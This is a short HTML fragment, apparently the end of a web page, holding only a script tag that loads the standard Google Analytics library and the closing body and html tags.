<script async src='https://www.google-analytics.com/analytics.js'></script>






</body>

</html>